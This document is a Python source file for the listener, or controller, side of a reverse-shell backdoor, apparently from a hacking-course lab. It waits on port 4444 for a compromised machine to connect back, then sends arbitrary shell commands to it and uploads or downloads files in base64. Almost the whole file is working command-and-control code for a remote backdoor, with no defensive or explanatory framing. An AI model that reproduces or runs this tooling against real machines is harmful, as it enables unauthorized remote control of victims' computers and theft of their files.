#!/usr/bin/env python
import socket
import json
import os
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)  # backlog value, doesn't have to be anything for no
        print("[+] Waiting for connections")
        self.connection, address = listener.accept()  # tells our computer to accept incoming
        print("[+] Got a connection from" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to" + path
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"
    def read_file(self,path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command = input(">>> ")
            command = command.split(" ")
           # try:
            if command[0] == "upload":
                file_content = self.read_file(command[1]).decode()
                command.append(file_content)

            result = self.execute_remotely(command)

            if command[0] == "download"and "[-] Error " not in result:
                result = self.write_file(command[1], result)
            #except Exception:
             #   result = "[-] Error during command execution"
            print(result)

my_listener = Listener("192.168.182.141", 4444)
my_listener.run()

#result = self.read_file(command[1], result)